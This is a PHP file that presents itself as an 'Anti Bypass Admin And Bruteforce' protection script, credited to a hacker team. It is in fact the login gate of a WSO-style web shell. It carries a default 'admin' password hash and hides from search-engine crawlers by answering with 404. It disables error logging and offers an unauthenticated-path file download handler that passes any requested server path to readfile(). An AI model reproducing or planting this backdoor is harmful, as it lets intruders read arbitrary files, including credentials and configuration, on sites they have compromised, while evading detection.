<?php
// Simple Anti Bypass Admin And Bruteforce
// Coded by Yukinoshita 47
// Now It's So Simple For Avoid Hacker And Cyber Criminal
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; // Password default: admin <-- segera ganti hash nya dengan password anda
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>Anti Bypass Admin</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #FFFFFF;
	color: green;
	text-align: center;
}
header {
	color: red;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted red;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<img src=http://static.zerochan.net/Shibuya.Rin.full.1842242.jpg height=300 width=210><br>
<br><b><font face="arial" color="black" size="3">Anti Bypass Admin And Bruteforce</font><br><br>
<form method="post">
<input type="password" name="pass">
</form>
<b><font face="arial" color="black" size="3">Coded by Yukinoshita 47 - Team Garuda Security Hacker</font>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>

<?php
echo "<a href='?logout=true'>Click Here For Go Back To Previous Page (Anti Bypass Admin And BruteForce Login Page)</a>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
?>
